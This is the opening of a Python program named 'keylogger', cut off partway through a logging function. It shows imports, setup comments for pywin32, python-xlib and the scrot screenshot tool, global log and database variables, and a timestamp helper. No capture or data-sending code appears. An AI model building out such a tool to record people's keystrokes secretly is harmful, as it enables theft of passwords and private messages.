import ctypes
import ctypes.util
import threading
import sqlite3
import datetime
import os
import sys
import os
import time
import os.path
import platform
import subprocess
import json
import logging
import logging.handlers

# Windows:
#   pip install pypiwin32
# Linux:
#   pip install python-xlib
#   sudo apt-get install scrot

# ---------------------------------------------------------
#  global variables
# ---------------------------------------------------------
g_app_name = "keylogger"
g_app_version = "1.0.0"
g_app_log = ""
g_app_log_date = ""
g_app_log_dir = ""
g_app_data_dir = ""
g_app_log_lock = threading.Lock()

g_db = None
g_db_lock = threading.Lock()

# ---------------------------------------------------------
#  get current time
# ---------------------------------------------------------
def get_curr_time():
    return str(datetime.datetime.now())

# ---------------------------------------------------------
#  log message
# ---------------------------------------------------------
def log_message(log_file
